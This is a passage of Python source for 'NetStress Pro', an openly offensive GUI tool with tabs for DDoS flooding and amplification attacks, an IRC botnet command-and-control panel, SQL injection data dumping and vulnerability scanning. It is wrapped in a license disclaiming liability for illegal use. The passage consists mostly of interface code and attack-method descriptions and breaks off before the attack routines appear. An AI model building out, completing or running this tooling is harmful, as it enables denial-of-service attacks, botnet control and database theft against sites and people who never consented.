import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, Canvas
import threading
import time
import random
import socket
import os
import sys
import math
import requests
import dns.resolver
from datetime import datetime
import json
import subprocess
import queue
import struct
import concurrent.futures
from urllib.parse import urlparse
import re
import select
import multiprocessing
from multiprocessing import Process, Queue, Pool, Manager
import asyncio
import aiohttp
import ipaddress
import whois
from scapy.all import IP, TCP, UDP, ICMP, send, Raw
import psutil
import speedtest
import geoip2.database
import numpy as np
from PIL import Image, ImageTk
import cv2
import pygame
import pyautogui
from screeninfo import get_monitors

DISCLAIMER = """
Copyright (c) 2025 Unknown Destroyer  
UDLPL v1.2 — Unknown Destroyer Limited Private License  

Permission is hereby granted, free of charge, to any individual or legal entity (“User”) obtaining a copy of this software and any associated documentation, files, materials, source code, binaries, scripts, or related components (collectively, the “Software”), to install, use, and modify the Software solely for personal, private, non-commercial, and non-distributive purposes, subject to the terms and conditions below.

---

1. LICENSE GRANT AND SCOPE OF USE

1.1 Permitted Use. The User may install, execute, analyze, and modify the Software for personal, private use only.

1.2 Prohibited Use. Any commercial, revenue-generating, service-providing, rental, sale, sublicensing, or profit-oriented use — whether direct or indirect — is strictly forbidden.

1.3 Non-Transferability. This license is personal to the User, non-transferable, and non-sublicensable. Any attempt to assign, sublicense, or otherwise transfer rights under this license is void.

---

2. DISTRIBUTION AND SHARING RESTRICTIONS

2.1 Allowed Sharing. Only unmodified, original versions of the Software may be shared, copied, or published, provided all copyright and license notices remain intact.

2.2 Modified Versions. Distribution, publication, sharing, or public posting of modified, altered, adapted, or derivative versions of the Software is strictly prohibited in all forms and media, whether digital or physical.

2.3 Circumvention Ban. Users are expressly forbidden from attempting to bypass these restrictions via obfuscation, encryption, or any other technical or procedural means.

---

3. INTELLECTUAL PROPERTY RIGHTS

3.1 Ownership. The Software remains the exclusive property of Unknown Destroyer.

3.2 No Transfer of Rights. Except as expressly stated herein, no rights or ownership are granted or transferred to the User.

3.3 Preservation of Notices. All proprietary notices, trademarks, and license texts must remain intact in all copies.

---

4. MODIFICATION CLAUSE

4.1 Private Modifications. Users may modify the Software for private use only.

4.2 No Public Release. Modified versions must not be distributed, shared, uploaded, or otherwise made available to third parties.

4.3 Responsibility. The User assumes all liability for modifications and waives any claims against the original author.

---

5. WARRANTY AND LIABILITY DISCLAIMER

5.1 No Warranty. The Software is provided “AS IS,” without any warranties, express or implied, including but not limited to merchantability, fitness for a particular purpose, or non-infringement.

5.2 Limitation of Liability. In no event shall Unknown Destroyer be liable for any direct, indirect, incidental, consequential, special, or exemplary damages, including but not limited to loss of profits, data, or business interruption, even if advised of such possibilities.

---

6. TERMINATION

6.1 Automatic Termination. This license terminates immediately if the User breaches any term.

6.2 Post-Termination Duties. Upon termination, the User must cease all use and delete/destroy all copies, including modifications.

6.3 Survival. Provisions regarding ownership, liability, and restrictions survive termination.

---

7. MISCELLANEOUS

7.1 Entire Agreement. This license constitutes the complete agreement between the parties regarding the Software.

7.2 Severability. If any provision is found unenforceable, the remainder shall remain in effect.

7.3 No Waiver. Failure to enforce any right or term is not a waiver of that right or term.

---

8. INDEMNITY AND LEGAL LIABILITY

8.1 No Liability for Illegal Use. The User agrees that any use of the Software for unlawful, malicious, or unauthorized purposes is entirely at their own risk and responsibility. Unknown Destroyer shall not be held liable or accountable for any damages, legal actions, claims, or penalties arising from such misuse.

8.2 Indemnification. The User agrees to indemnify, defend, and hold harmless Unknown Destroyer from and against any and all claims, liabilities, losses, damages, costs, or expenses (including legal fees) arising out of or related to the User’s use or misuse of the Software, including but not limited to violations of law, regulations, or third-party rights.

8.3 No Warranty Against Misuse. Unknown Destroyer makes no representation or warranty that the Software is suitable for any particular purpose, including legal compliance, and expressly disclaims any responsibility for consequences resulting from illegal or improper use.

---

Summary:

- You CAN: Use and modify privately for non-commercial purposes.
- You CAN’T: Distribute, share, or profit from modified versions.
- You MAY: Share the original, unmodified version with this license attached.
- Breach = Instant termination.
- Illegal or misuse of the Software is your problem, not mine.

By installing, copying, or modifying the Software, you agree to all terms stated above.
"""

class PyNetStress:
    def __init__(self, root):
        self.root = root
        self.root.title("NetStress Pro - Advanced DDoS/DOS Tool")
        self.root.geometry("1600x1000")
        self.root.configure(bg='#0a0f1a')
        
        self.center_window()
        
        pygame.mixer.init()
        
        try:
            self.root.iconbitmap(self.resource_path("icon.ico"))
        except:
            pass
        
        if not self.check_agreement():
            self.show_disclaimer()
        
        self.running = False
        self.attack_process = None
        self.attack_mode = "DDoS"
        self.bot_count = 100
        self.thread_count = 50
        self.method = "HTTP Flood"
        self.target_ip = "127.0.0.1"
        self.target_url = ""
        self.target_port = 80
        self.duration = 30
        self.use_proxies = False
        self.proxies = []
        self.status_indicator = "gray"
        self.logs = []
        
        self.manager = Manager()
        self.attack_stats = self.manager.dict({
            "packets_sent": 0,
            "requests_sent": 0,
            "bytes_sent": 0,
            "start_time": 0,
            "active_bots": 0,
            "active_threads": 0,
            "success_rate": 0,
            "target_status": "Unknown",
            "connection_status": {},
            "thread_status": {}
        })
        
        self.animation_items = []
        self.packet_trails = []
        self.log_queue = multiprocessing.Queue()
        self.stats_queue = multiprocessing.Queue()
        self.worker_processes = []
        self.executor = None
        self.last_animation_time = 0
        self.animation_delay = 30  
        self.last_resolve_time = 0
        self.resolve_delay = 300 
        self.last_status_update = 0
        self.stats_lock = threading.Lock()
        self.bot_details = {}
        self.selected_bot = None
        self.attack_history = []
        self.current_theme = "Dark"
        self.sound_effects = True
        self.performance_mode = False
        
        self.cpu_usage = 0
        self.memory_usage = 0
        self.network_usage = 0
        self.start_network_stats = psutil.net_io_counters()
        
        threading.Thread(target=self.create_gui, daemon=True).start()
        
        self.monitor_performance()
        
    def center_window(self):
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry('{}x{}+{}+{}'.format(width, height, x, y))
    
    def resource_path(self, relative_path):
        try:
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")
        return os.path.join(base_path, relative_path)
    
    def check_agreement(self):
        try:
            with open("agreement.json", "r") as f:
                data = json.load(f)
                return data.get("agreed", False)
        except:
            return False
    
    def save_agreement(self):
        with open("agreement.json", "w") as f:
            json.dump({"agreed": True}, f)
    
    def show_disclaimer(self):
        disclaimer_window = tk.Toplevel(self.root)
        disclaimer_window.title("IMPORTANT LEGAL DISCLAIMER")
        disclaimer_window.geometry("900x650")
        disclaimer_window.resizable(False, False)
        disclaimer_window.attributes("-topmost", True)
        disclaimer_window.grab_set()
        disclaimer_window.configure(bg='#1a1a1a')
        
        frame = ttk.Frame(disclaimer_window, padding=20)
        frame.pack(fill='both', expand=True)
        
        ttk.Label(frame, text="NETSTRESS PRO - LEGAL AGREEMENT", 
                 font=("Arial", 16, "bold"), foreground='red').pack(pady=10)
        
        text = scrolledtext.ScrolledText(frame, wrap=tk.WORD, width=100, height=25,
                                        bg='#2a2a2a', fg='white', insertbackground='white')
        text.insert(tk.INSERT, DISCLAIMER)
        text.configure(state='disabled', font=("Arial", 10))
        text.pack(pady=10)
        
        ttk.Label(frame, text="Do you agree to use this tool only for legal, educational purposes?", 
                 font=("Arial", 10), foreground='white').pack(pady=5)
        
        agree_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(frame, text="I agree to the terms above", variable=agree_var,
                       style='Custom.TCheckbutton').pack(pady=5)
        
        def proceed():
            if agree_var.get():
                self.save_agreement()
                disclaimer_window.destroy()
                self.play_sound("startup")
            else:
                messagebox.showerror("Agreement Required", "You must agree to the terms to use this tool")
        
        ttk.Button(frame, text="PROCEED", command=proceed, style='Accent.TButton').pack(pady=10)
        
        disclaimer_window.protocol("WM_DELETE_WINDOW", lambda: sys.exit(0))
    
    def play_sound(self, sound_type):
        if not self.sound_effects:
            return
            
        sound_path = self.resource_path(f"sounds/{sound_type}.wav")
        if os.path.exists(sound_path):
            try:
                sound = pygame.mixer.Sound(sound_path)
                sound.set_volume(0.3)
                sound.play()
            except:
                pass
    
    def create_gui(self):
        self.setup_styles()
        
        notebook = ttk.Notebook(self.root, style='Custom.TNotebook')
        notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        attack_frame = ttk.Frame(notebook, padding=10)
        notebook.add(attack_frame, text='DDoS Attack')
        self.create_attack_tab(attack_frame)
        
        recon_frame = ttk.Frame(notebook, padding=10)
        notebook.add(recon_frame, text='Reconnaissance')
        self.create_recon_tab(recon_frame)
        
        irc_frame = ttk.Frame(notebook, padding=10)
        notebook.add(irc_frame, text='IRC C&C')
        self.create_irc_tab(irc_frame)
        
        methods_frame = ttk.Frame(notebook, padding=10)
        notebook.add(methods_frame, text='Attack Methods')
        self.create_methods_tab(methods_frame)
        
        sql_frame = ttk.Frame(notebook, padding=10)
        notebook.add(sql_frame, text='SQL Injection')
        self.create_sql_tab(sql_frame)
        
        exploit_frame = ttk.Frame(notebook, padding=10)
        notebook.add(exploit_frame, text='Vulnerability Scanner')
        self.create_exploit_tab(exploit_frame)
        
        settings_frame = ttk.Frame(notebook, padding=10)
        notebook.add(settings_frame, text='Settings')
        self.create_settings_tab(settings_frame)
        
        stats_frame = ttk.Frame(notebook, padding=10)
        notebook.add(stats_frame, text='Statistics')
        self.create_stats_tab(stats_frame)
        
        self.create_status_bar()
        
        self.root.after(100, self.process_queues)
        
        self.root.after(50, self.animate_attack)
        
        self.update_status_indicator()
    
    def setup_styles(self):
        style = ttk.Style()
        
        if self.current_theme == "Dark":
            bg_color = '#0a0f1a'
            fg_color = '#ffffff'
            accent_color = '#1e90ff'
            frame_color = '#1a2436'
            text_color = '#ffffff'
        elif self.current_theme == "Light":
            bg_color = '#f0f0f0'
            fg_color = '#000000'
            accent_color = '#1e90ff'
            frame_color = '#e0e0e0'
            text_color = '#000000'
        elif self.current_theme == "Blue":
            bg_color = '#0a1a2a'
            fg_color = '#ffffff'
            accent_color = '#00bfff'
            frame_color = '#1a2a3a'
            text_color = '#ffffff'
        else:  
            bg_color = '#001100'
            fg_color = '#00ff00'
            accent_color = '#00ff00'
            frame_color = '#002200'
            text_color = '#00ff00'
        
        self.root.configure(bg=bg_color)
        
        style.configure('TFrame', background=frame_color)
        style.configure('TLabel', background=frame_color, foreground=text_color)
        style.configure('TButton', background=accent_color, foreground=text_color)
        style.configure('TNotebook', background=frame_color, borderwidth=0)
        style.configure('TNotebook.Tab', background=frame_color, foreground=text_color, padding=[10, 5])
        style.map('TNotebook.Tab', background=[('selected', accent_color)], foreground=[('selected', 'white')])
        style.configure('TLabelframe', background=frame_color, foreground=text_color)
        style.configure('TLabelframe.Label', background=frame_color, foreground=accent_color)
        style.configure('TEntry', fieldbackground='#2a2a2a', foreground=text_color)
        style.configure('TCombobox', fieldbackground='#2a2a2a', foreground=text_color)
        style.configure('TCheckbutton', background=frame_color, foreground=text_color)
        style.configure('Custom.TCheckbutton', background=frame_color, foreground=text_color)
        style.configure('Accent.TButton', background=accent_color, foreground='white', font=('Arial', 10, 'bold'))
        
        style.configure('Status.TFrame', background='#1a2d3d')
        style.configure('Status.TLabel', background='#1a2d3d', foreground='white')
    
    def create_attack_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True)
        

        left_frame = ttk.Frame(main_frame, width=400)
        left_frame.pack(side='left', fill='y', padx=10, pady=10)
        left_frame.pack_propagate(False)
        

        target_frame = ttk.LabelFrame(left_frame, text="Target Configuration", padding=10)
        target_frame.pack(fill='x', pady=5)
        
        ttk.Label(target_frame, text="Target URL:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.target_entry = ttk.Entry(target_frame, width=30)
        self.target_entry.grid(row=0, column=1, padx=5, pady=5, sticky='we')
        self.target_entry.insert(0, "http://127.0.0.1")
        self.target_entry.bind("<KeyRelease>", self.schedule_resolution)
        
        ttk.Label(target_frame, text="Resolved IP:").grid(row=1, column=0, padx=5, pady=5, sticky='w')
        self.ip_entry = ttk.Entry(target_frame, width=30)
        self.ip_entry.grid(row=1, column=1, padx=5, pady=5, sticky='we')
        self.ip_entry.insert(0, "127.0.0.1")
        
        ttk.Label(target_frame, text="Port:").grid(row=2, column=0, padx=5, pady=5, sticky='w')
        self.port_entry = ttk.Entry(target_frame, width=10)
        self.port_entry.grid(row=2, column=1, padx=5, pady=5, sticky='w')
        self.port_entry.insert(0, "80")
        
        ttk.Label(target_frame, text="Geolocation:").grid(row=3, column=0, padx=5, pady=5, sticky='w')
        self.geo_label = ttk.Label(target_frame, text="Unknown", foreground='orange')
        self.geo_label.grid(row=3, column=1, padx=5, pady=5, sticky='w')
        

        mode_frame = ttk.LabelFrame(left_frame, text="Attack Mode", padding=10)
        mode_frame.pack(fill='x', pady=10)
        
        self.mode_var = tk.StringVar(value="DDoS")
        ttk.Radiobutton(mode_frame, text="Distributed Denial of Service (DDoS)", 
                        variable=self.mode_var, value="DDoS", command=self.update_mode).pack(side='left', padx=10)
        ttk.Radiobutton(mode_frame, text="Denial of Service (DoS)", 
                        variable=self.mode_var, value="DoS", command=self.update_mode).pack(side='left', padx=10)
        

        bot_frame = ttk.LabelFrame(left_frame, text="Bot Configuration", padding=10)
        bot_frame.pack(fill='x', pady=5)
        
        ttk.Label(bot_frame, text="Number of Bots:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.bot_slider = ttk.Scale(bot_frame, from_=1, to=10000, orient='horizontal', 
                                   command=lambda v: self.bot_var.set(int(float(v))))
        self.bot_slider.grid(row=0, column=1, padx=5, pady=5, sticky='we')
        self.bot_var = tk.IntVar(value=100)
        self.bot_entry = ttk.Entry(bot_frame, textvariable=self.bot_var, width=10)
        self.bot_entry.grid(row=0, column=2, padx=5, pady=5, sticky='w')
        
        ttk.Label(bot_frame, text="Threads per Bot:").grid(row=1, column=0, padx=5, pady=5, sticky='w')
        self.thread_slider = ttk.Scale(bot_frame, from_=1, to=500, orient='horizontal', 
                                      command=lambda v: self.thread_var.set(int(float(v))))
        self.thread_slider.grid(row=1, column=1, padx=5, pady=5, sticky='we')
        self.thread_var = tk.IntVar(value=50)
        self.thread_entry = ttk.Entry(bot_frame, textvariable=self.thread_var, width=10)
        self.thread_entry.grid(row=1, column=2, padx=5, pady=5, sticky='w')
        

        param_frame = ttk.LabelFrame(left_frame, text="Attack Parameters", padding=10)
        param_frame.pack(fill='x', pady=5)
        
        ttk.Label(param_frame, text="Attack Method:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.method_var = tk.StringVar()
        self.method_combo = ttk.Combobox(param_frame, textvariable=self.method_var, width=20)
        self.method_combo['values'] = ('HTTP Flood', 'UDP Flood', 'SYN Flood', 'ICMP Flood', 
                                      'Slowloris', 'DNS Amplification', 'SSDP', 'NTP Amplification',
                                      'Memcached', 'Ping of Death', 'RUDY', 'HTTP Killer', 'Mixed Attack')
        self.method_combo.current(0)
        self.method_combo.grid(row=0, column=1, padx=5, pady=5, sticky='w')
        
        ttk.Label(param_frame, text="Duration (seconds):").grid(row=0, column=2, padx=5, pady=5, sticky='w')
        self.duration_var = tk.IntVar(value=30)
        self.duration_entry = ttk.Entry(param_frame, textvariable=self.duration_var, width=10)
        self.duration_entry.grid(row=0, column=3, padx=5, pady=5, sticky='w')
        
        self.proxy_var = tk.BooleanVar(value=False)
        self.proxy_check = ttk.Checkbutton(param_frame, text="Use Proxies", variable=self.proxy_var,
                                          command=self.toggle_proxy)
        self.proxy_check.grid(row=1, column=0, padx=5, pady=5, sticky='w')
        
        self.proxy_button = ttk.Button(param_frame, text="Load Proxy List", state='disabled', 
                                     command=self.load_proxy_file)
        self.proxy_button.grid(row=1, column=1, padx=5, pady=5, sticky='w')
        

        control_frame = ttk.Frame(left_frame)
        control_frame.pack(fill='x', pady=15)
        
        self.start_button = ttk.Button(control_frame, text="Start Attack", width=15, 
                                     command=self.start_attack, style='Accent.TButton')
        self.start_button.pack(side='left', padx=10)
        
        self.stop_button = ttk.Button(control_frame, text="Stop Attack", width=15, state='disabled', 
                                    command=self.stop_attack)
        self.stop_button.pack(side='left', padx=10)
        
        self.reset_button = ttk.Button(control_frame, text="Reset", width=15, command=self.reset)
        self.reset_button.pack(side='right', padx=10)
        

        self.progress_var = tk.DoubleVar(value=0.0)
        self.progress = ttk.Progressbar(left_frame, variable=self.progress_var, maximum=100, 
                                       mode='determinate', length=300)
        self.progress.pack(fill='x', pady=10)
        

        log_frame = ttk.LabelFrame(left_frame, text="Attack Logs", padding=10)
        log_frame.pack(fill='both', expand=True, padx=5, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, width=80, height=10,
                                                bg='#1a2d3d', fg='#ffffff', insertbackground='white')
        self.log_text.pack(fill='both', expand=True, padx=5, pady=5)
        self.log_text.configure(state='disabled')
        

        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', expand=True, padx=10, pady=10)
        
        vis_frame = ttk.LabelFrame(right_frame, text="Attack Visualization", padding=10)
        vis_frame.pack(fill='both', expand=True)
        

        self.canvas = Canvas(vis_frame, bg='#0a111a', highlightthickness=0)
        self.canvas.pack(fill='both', expand=True)
        self.canvas.bind("<Button-1>", self.on_canvas_click)
        

        details_frame = ttk.LabelFrame(right_frame, text="Bot Details", padding=10)
        details_frame.pack(fill='x', pady=10)
        
        self.bot_details_text = scrolledtext.ScrolledText(details_frame, wrap=tk.WORD, width=80, height=8,
                                                         bg='#1a2d3d', fg='#ffffff', insertbackground='white')
        self.bot_details_text.pack(fill='both', expand=True, padx=5, pady=5)
        self.bot_details_text.insert(tk.END, "Select a bot to view details")
        self.bot_details_text.configure(state='disabled')
        

        self.create_visualization()
    
    def create_recon_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True)
        
        tools_frame = ttk.LabelFrame(main_frame, text="Reconnaissance Tools", padding=10, width=300)
        tools_frame.pack(side='left', fill='y', padx=10, pady=10)
        tools_frame.pack_propagate(False)
        
        ttk.Label(tools_frame, text="Target:").pack(pady=5)
        self.recon_entry = ttk.Entry(tools_frame, width=30)
        self.recon_entry.pack(pady=5)
        self.recon_entry.insert(0, "example.com")
        
        ttk.Button(tools_frame, text="Ping", command=lambda: self.start_recon("ping")).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="Traceroute", command=lambda: self.start_recon("traceroute")).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="Port Scan", command=lambda: self.start_recon("portscan")).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="WHOIS Lookup", command=lambda: self.start_recon("whois")).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="DNS Enumeration", command=lambda: self.start_recon("dns")).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="Subdomain Scan", command=lambda: self.start_recon("subdomain")).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="Geolocation", command=lambda: self.start_recon("geo")).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="Network Scan", command=lambda: self.start_recon("networkscan")).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="Vulnerability Scan", command=lambda: self.start_recon("vulnscan")).pack(pady=5, fill='x')
        
        result_frame = ttk.LabelFrame(main_frame, text="Reconnaissance Results", padding=10)
        result_frame.pack(side='right', fill='both', expand=True, padx=10, pady=10)
        
        self.recon_text = scrolledtext.ScrolledText(result_frame, wrap=tk.WORD, width=80, height=30,
                                                  bg='#1a2d3d', fg='#ffffff', insertbackground='white')
        self.recon_text.pack(fill='both', expand=True, padx=5, pady=5)
        self.recon_text.insert(tk.END, "Select a reconnaissance tool from the left panel")
        self.recon_text.configure(state='disabled')
    
    def create_irc_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True)
        
        paned = ttk.PanedWindow(main_frame, orient=tk.HORIZONTAL)
        paned.pack(fill='both', expand=True, padx=10, pady=10)
        
        config_frame = ttk.LabelFrame(paned, text="IRC Configuration", padding=10, width=300)
        paned.add(config_frame, weight=1)
        
        ttk.Label(config_frame, text="Server:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.irc_server = ttk.Entry(config_frame, width=25)
        self.irc_server.grid(row=0, column=1, padx=5, pady=5, sticky='w')
        self.irc_server.insert(0, "irc.example.com")
        
        ttk.Label(config_frame, text="Port:").grid(row=1, column=0, padx=5, pady=5, sticky='w')
        self.irc_port = ttk.Entry(config_frame, width=10)
        self.irc_port.grid(row=1, column=1, padx=5, pady=5, sticky='w')
        self.irc_port.insert(0, "6667")
        
        ttk.Label(config_frame, text="Channel:").grid(row=2, column=0, padx=5, pady=5, sticky='w')
        self.irc_channel = ttk.Entry(config_frame, width=25)
        self.irc_channel.grid(row=2, column=1, padx=5, pady=5, sticky='w')
        self.irc_channel.insert(0, "#botnet")
        
        ttk.Label(config_frame, text="Bot Prefix:").grid(row=3, column=0, padx=5, pady=5, sticky='w')
        self.irc_prefix = ttk.Entry(config_frame, width=10)
        self.irc_prefix.grid(row=3, column=1, padx=5, pady=5, sticky='w')
        self.irc_prefix.insert(0, "bot")
        
        ttk.Label(config_frame, text="Password:").grid(row=4, column=0, padx=5, pady=5, sticky='w')
        self.irc_password = ttk.Entry(config_frame, width=15, show="*")
        self.irc_password.grid(row=4, column=1, padx=5, pady=5, sticky='w')
        
        ttk.Button(config_frame, text="Connect", command=self.connect_irc).grid(row=5, column=0, columnspan=2, pady=10, sticky='we')
        ttk.Button(config_frame, text="Disconnect", command=self.disconnect_irc).grid(row=6, column=0, columnspan=2, pady=5, sticky='we')
        ttk.Button(config_frame, text="Send Command", command=self.send_irc_command).grid(row=7, column=0, columnspan=2, pady=5, sticky='we')
        ttk.Button(config_frame, text="Build Botnet", command=self.build_botnet).grid(row=8, column=0, columnspan=2, pady=10, sticky='we')
        

        comm_frame = ttk.LabelFrame(paned, text="IRC Communication", padding=10)
        paned.add(comm_frame, weight=2)
        

        status_frame = ttk.Frame(comm_frame)
        status_frame.pack(fill='x', pady=5)
        
        ttk.Label(status_frame, text="Connected Bots:").pack(side='left')
        self.bot_count_label = ttk.Label(status_frame, text="0", foreground='green')
        self.bot_count_label.pack(side='left', padx=5)
        
        ttk.Label(status_frame, text="Active Commands:").pack(side='left', padx=20)
        self.cmd_count_label = ttk.Label(status_frame, text="0", foreground='orange')
        self.cmd_count_label.pack(side='left', padx=5)
        

        cmd_frame = ttk.Frame(comm_frame)
        cmd_frame.pack(fill='x', pady=5)
        
        ttk.Label(cmd_frame, text="Command:").pack(side='left')
        self.irc_command = ttk.Entry(cmd_frame)
        self.irc_command.pack(side='left', padx=5, fill='x', expand=True)
        self.irc_command.bind("<Return>", lambda e: self.send_irc_command())
        

        self.irc_text = scrolledtext.ScrolledText(comm_frame, wrap=tk.WORD, width=80, height=20,
                                                bg='#1a2d3d', fg='#ffffff', insertbackground='white')
        self.irc_text.pack(fill='both', expand=True, padx=5, pady=5)
        self.irc_text.insert(tk.END, "Not connected to IRC server")
        self.irc_text.configure(state='disabled')
    
    def create_sql_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True)
        

        tools_frame = ttk.LabelFrame(main_frame, text="SQL Injection Tools", padding=10, width=300)
        tools_frame.pack(side='left', fill='y', padx=10, pady=10)
        tools_frame.pack_propagate(False)
        
        ttk.Label(tools_frame, text="Target URL:").pack(pady=5)
        self.sql_target = ttk.Entry(tools_frame, width=30)
        self.sql_target.pack(pady=5)
        self.sql_target.insert(0, "http://example.com/page.php?id=1")
        
        ttk.Label(tools_frame, text="Parameter:").pack(pady=5)
        self.sql_param = ttk.Entry(tools_frame, width=30)
        self.sql_param.pack(pady=5)
        self.sql_param.insert(0, "id")
        
        ttk.Button(tools_frame, text="Test for SQLi", command=self.test_sqli).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="Extract Database", command=self.extract_database).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="Extract Tables", command=self.extract_tables).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="Extract Columns", command=self.extract_columns).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="Dump Data", command=self.dump_data).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="SQL Map (Auto)", command=self.run_sqlmap).pack(pady=5, fill='x')
        

        result_frame = ttk.LabelFrame(main_frame, text="SQL Injection Results", padding=10)
        result_frame.pack(side='right', fill='both', expand=True, padx=10, pady=10)
        
        self.sql_text = scrolledtext.ScrolledText(result_frame, wrap=tk.WORD, width=80, height=30,
                                                bg='#1a2d3d', fg='#ffffff', insertbackground='white')
        self.sql_text.pack(fill='both', expand=True, padx=5, pady=5)
        self.sql_text.insert(tk.END, "SQL Injection results will appear here")
        self.sql_text.configure(state='disabled')
    
    def create_exploit_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True)
        

        tools_frame = ttk.LabelFrame(main_frame, text="Vulnerability Scanner", padding=10, width=300)
        tools_frame.pack(side='left', fill='y', padx=10, pady=10)
        tools_frame.pack_propagate(False)
        
        ttk.Label(tools_frame, text="Target:").pack(pady=5)
        self.exploit_target = ttk.Entry(tools_frame, width=30)
        self.exploit_target.pack(pady=5)
        self.exploit_target.insert(0, "example.com")
        
        ttk.Button(tools_frame, text="Scan Common Vulnerabilities", command=self.scan_vulnerabilities).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="Check XSS", command=self.check_xss).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="Check CSRF", command=self.check_csrf).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="Check File Inclusion", command=self.check_file_inclusion).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="Check Command Injection", command=self.check_command_injection).pack(pady=5, fill='x')
        ttk.Button(tools_frame, text="Full Scan", command=self.full_scan).pack(pady=5, fill='x')
        

        result_frame = ttk.LabelFrame(main_frame, text="Scan Results", padding=10)
        result_frame.pack(side='right', fill='both', expand=True, padx=10, pady=10)
        
        self.exploit_text = scrolledtext.ScrolledText(result_frame, wrap=tk.WORD, width=80, height=30,
                                                    bg='#1a2d3d', fg='#ffffff', insertbackground='white')
        self.exploit_text.pack(fill='both', expand=True, padx=5, pady=5)
        self.exploit_text.insert(tk.END, "Vulnerability scan results will appear here")
        self.exploit_text.configure(state='disabled')
    
    def create_methods_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True)
        

        method_frame = ttk.LabelFrame(main_frame, text="Attack Methods", padding=10, width=250)
        method_frame.pack(side='left', fill='y', padx=10, pady=10)
        method_frame.pack_propagate(False)
        
        self.method_list = ttk.Combobox(method_frame, width=20)
        self.method_list['values'] = ('HTTP Flood', 'UDP Flood', 'SYN Flood', 'ICMP Flood', 
                                    'Slowloris', 'DNS Amplification', 'SSDP', 'NTP Amplification',
                                    'Memcached', 'Ping of Death', 'RUDY', 'HTTP Killer', 'Mixed Attack')
        self.method_list.current(0)
        self.method_list.pack(pady=10)
        

        details_frame = ttk.LabelFrame(main_frame, text="Method Details", padding=10)
        details_frame.pack(side='right', fill='both', expand=True, padx=10, pady=10)
        
        self.method_text = scrolledtext.ScrolledText(details_frame, wrap=tk.WORD, width=80, height=20,
                                                   bg='#1a2d3d', fg='#ffffff', insertbackground='white')
        self.method_text.pack(fill='both', expand=True, padx=5, pady=5)
        

        params_frame = ttk.LabelFrame(main_frame, text="Method Parameters", padding=10)
        params_frame.pack(side='left', fill='both', expand=True, padx=10, pady=10)
        

        self.http_frame = ttk.Frame(params_frame)
        self.http_frame.pack(fill='x', pady=5)
        
        ttk.Label(self.http_frame, text="Request Rate:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.http_rate = ttk.Scale(self.http_frame, from_=1, to=1000, orient='horizontal')
        self.http_rate.set(100)
        self.http_rate.grid(row=0, column=1, padx=5, pady=5, sticky='we')
        
        ttk.Label(self.http_frame, text="Keep-Alive:").grid(row=1, column=0, padx=5, pady=5, sticky='w')
        self.http_keepalive = ttk.Checkbutton(self.http_frame, text="Enable")
        self.http_keepalive.state(['selected'])
        self.http_keepalive.grid(row=1, column=1, padx=5, pady=5, sticky='w')
        

        self.udp_frame = ttk.Frame(params_frame)
        self.udp_frame.pack(fill='x', pady=5)
        
        ttk.Label(self.udp_frame, text="Packet Size:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.udp_size = ttk.Scale(self.udp_frame, from_=64, to=1500, orient='horizontal')
        self.udp_size.set(512)
        self.udp_size.grid(row=0, column=1, padx=5, pady=5, sticky='we')
        
        ttk.Label(self.udp_frame, text="Packet Rate:").grid(row=1, column=0, padx=5, pady=5, sticky='w')
        self.udp_rate = ttk.Scale(self.udp_frame, from_=1, to=1000, orient='horizontal')
        self.udp_rate.set(100)
        self.udp_rate.grid(row=1, column=1, padx=5, pady=5, sticky='we')
        

        self.udp_frame.pack_forget()
        

        self.method_descriptions = {
            "HTTP Flood": "Sends a flood of HTTP requests to overwhelm a web server. This is the most common application layer attack.",
            "UDP Flood": "Floods the target with UDP packets to random ports, causing the host to check for applications and reply with ICMP packets.",
            "SYN Flood": "Exploits the TCP handshake by sending a flood of SYN packets and never completing the connection.",
            "ICMP Flood": "Overwhelms the target with ICMP Echo Request (ping) packets, consuming bandwidth and resources.",
            "Slowloris": "Opens multiple connections to the target and keeps them open by sending partial HTTP requests.",
            "DNS Amplification": "Exploits DNS servers to amplify attack traffic by sending small queries that return large responses.",
            "SSDP": "Uses Simple Service Discovery Protocol to amplify attack traffic through vulnerable UPnP devices.",
            "NTP Amplification": "Exploits Network Time Protocol servers to amplify attack traffic.",
            "Memcached": "Abuses unprotected Memcached servers to amplify attack traffic.",
